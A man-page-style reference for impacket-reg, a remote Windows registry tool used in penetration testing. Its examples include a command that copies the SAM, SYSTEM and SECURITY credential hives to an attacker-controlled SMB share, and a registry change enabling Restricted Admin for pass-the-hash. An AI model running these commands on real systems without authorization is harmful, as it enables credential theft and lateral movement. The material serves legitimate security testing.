# TAGLINE

Remote Windows registry manipulation tool

# TLDR

**Query a registry key** and list its subkeys and values

```impacket-reg '[domain]/[user]:[password]@[target]' query -keyName 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion'```

**Recursively query** all subkeys under a registry path

```impacket-reg '[domain]/[user]:[password]@[target]' query -keyName 'HKLM\SYSTEM\CurrentControlSet' -s```

**Query a specific value** by name

```impacket-reg '[domain]/[user]:[password]@[target]' query -keyName 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion' -v ProductName```

**Add a registry value**

```impacket-reg '[domain]/[user]:[password]@[target]' add -keyName 'HKLM\SYSTEM\CurrentControlSet\Control\Lsa' -v DisableRestrictedAdmin -vt REG_DWORD -vd 0```

**Delete a registry value**

```impacket-reg '[domain]/[user]:[password]@[target]' delete -keyName 'HKLM\SOFTWARE\TestKey' -v TestValue```

**Backup SAM, SYSTEM, and SECURITY hives**

```impacket-reg '[domain]/[user]:[password]@[target]' backup -o '\\[attacker_ip]\[share]'```

# SYNOPSIS

**impacket-reg** [_-debug_] [_-ts_] [_-hashes LMHASH:NTHASH_] [_-k_] [_-no-pass_] [_-aesKey KEY_] [_-dc-ip IP_] [_-target-ip IP_] [_-port PORT_] _target_ {**query**|**add**|**delete**|**save**|**backup**}

# PARAMETERS

**-debug**
> Turn DEBUG output on.

**-ts**
> Add timestamp to every logging output.

**-hashes** _LMHASH:NTHASH_
> Use NTLM hashes for authentication.

**-no-pass**
> Do not prompt for password.

**-k**
> Use Kerberos authentication from ccache file (KRB5CCNAME).

**-aesKey** _KEY_
> AES key for Kerberos authentication (128 or 256 bit).

**-dc-ip** _IP_
> IP address of the domain controller.

**-target-ip** _IP_
> IP address of the target machine.

**-port** _PORT_
> Destination port (139 or 445, default 445).

# QUERY OPTIONS

**-keyName** _KEYNAME_
> Full registry path with root key (HKLM, HKU, HKCU, HKCR).

**-v** _VALUENAME_
> Query a specific registry value name.

**-ve**
> Query the default (empty) value name.

**-s**
> Recursively query all subkeys and values.

# ADD OPTIONS

**-keyName** _KEYNAME_
> Full registry path for the new key or value.

**-v** _VALUENAME_
> Value name to set.

**-vt** _VALUETYPE_
> Registry type (REG_SZ, REG_DWORD, REG_BINARY, REG_EXPAND_SZ, REG_MULTI_SZ, REG_QWORD, etc.).

**-vd** _VALUEDATA_
> Data to set. Use multiple times for REG_MULTI_SZ.

# DELETE OPTIONS

**-keyName** _KEYNAME_
> Full registry path to delete from.

**-v** _VALUENAME_
> Specific value to delete.

**-va**
> Delete all values under the key.

**-ve**
> Delete the default value.

# DESCRIPTION

**impacket-reg** provides remote Windows registry manipulation through the MS-RRP MSRPC interface, functioning as a remote equivalent to Windows **reg.exe**. It can query, add, delete, and save registry keys and values on remote Windows machines.

The tool automatically starts the Remote Registry service on the target if it is not running (even if disabled), and restores the original state when finished. This makes it effective even against hardened hosts where the service has been manually disabled.

# CAVEATS

Requires administrative credentials on the target. Valid root keys are **HKLM**, **HKU**, **HKCU**, and **HKCR**. Modifying critical registry keys (e.g. under SYSTEM or Security) can render the target unbootable. The backup command writes to a UNC path, so the attacker must have a writable SMB share accessible from the target.

# HISTORY

Part of the **Impacket** library by **SecureAuth** (now **Fortra**). The tool implements the MS-RRP (Windows Remote Registry Protocol) specification over MSRPC, enabling remote registry operations commonly used in penetration testing for persistence, lateral movement, and credential extraction.

# SEE ALSO

[impacket-secretsdump](/man/impacket-secretsdump)(1), [impacket-psexec](/man/impacket-psexec)(1), [impacket-smbclient](/man/impacket-smbclient)(1)
